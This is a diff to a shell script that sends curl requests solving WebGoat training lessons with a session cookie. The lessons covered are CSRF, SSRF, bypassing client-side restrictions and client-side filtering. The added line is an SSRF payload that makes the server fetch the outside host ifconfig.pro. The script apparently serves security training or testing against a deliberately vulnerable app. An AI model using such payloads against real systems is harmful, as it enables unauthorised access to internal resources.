@@ -225,7 +225,8 @@ curl "$1/WebGoat/csrf/confirm-flag-1" -H "Cookie: $COOKIE" --data 'confirmFlagVa
 curl "$1/WebGoat/csrf/feedback/message" -H "Cookie: $COOKIE" --data '{"name":"mengzhu","email":"2589580404@qq.com","subject":"service","message":"qqqq"}'
 curl -X GET "$1/WebGoat/csrf/login" -H "Cookie: $COOKIE"
 curl "$1/WebGoat/SSRF/task1" -H "Cookie: $COOKIE" --data 'url=images%2Ftom.png'
-curl "$1/WebGoat/SSRF/task2" -H "Cookie: $COOKIE" --data 'url=images%2Fcat.png'
+# curl "$1/WebGoat/SSRF/task2" -H "Cookie: $COOKIE" --data 'url=images%2Fcat.png'
+curl "$1/WebGoat/SSRF/task2" -H "Cookie: $COOKIE" --data 'url=http:%2f%2fifconfig.pro'
 curl "$1/WebGoat/BypassRestrictions/FieldRestrictions" -H "Cookie: $COOKIE" --data 'select=option1&radio=option1&checkbox=on&shortInput=12345&readOnlyInput=change'
 curl "$1/WebGoat/BypassRestrictions/frontendValidation/" -H "Cookie: $COOKIE" --data 'field1=abc&field2=123&field3=abc+123+ABC&field4=seven&field5=01101&field6=90210-1111&field7=301-604-4882&error=0'
 curl "$1/WebGoat/clientSideFiltering/attack1" -H "Cookie: $COOKIE" --data 'userID=101&UserSelect=108&answer=110000'
